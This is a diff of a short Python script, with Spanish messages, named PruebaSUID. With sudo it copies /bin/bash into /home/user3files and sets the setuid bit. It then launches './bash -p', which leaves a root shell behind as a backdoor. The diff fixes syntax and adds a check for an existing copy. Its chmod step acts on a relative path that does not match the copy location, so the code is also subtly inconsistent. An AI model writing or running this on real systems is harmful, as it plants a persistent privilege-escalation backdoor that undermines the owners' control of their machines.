@@ -1,9 +1,14 @@
-Def PruebaSUID():
+def PruebaSUID():
   import os
-  Com1 = ‘sudo cp -rp /bin/bash /home/user3files’
-  Com2 = ‘sudo chmod u+s bash’
-  Com3 = ‘./bash -p’
-  os.system(Com1)
-  os.system(Com2)
-  os.system(Com3)
+  import os.path
+
+  if os.path.isfile('/home/user3files/bash'):
+        print("Bash existente ... ingresando al modo con privilegios")
+        os.system('./bash -p')
+  else:
+        com1 = 'sudo cp -rp /bin/bash /home/user3files'
+        com2 = 'sudo chmod u+s bash'
+        os.system(com1)
+        os.system(com2)
+        print("Bash copiado, ejecutar el programa de nuevo")
 PruebaSUID()
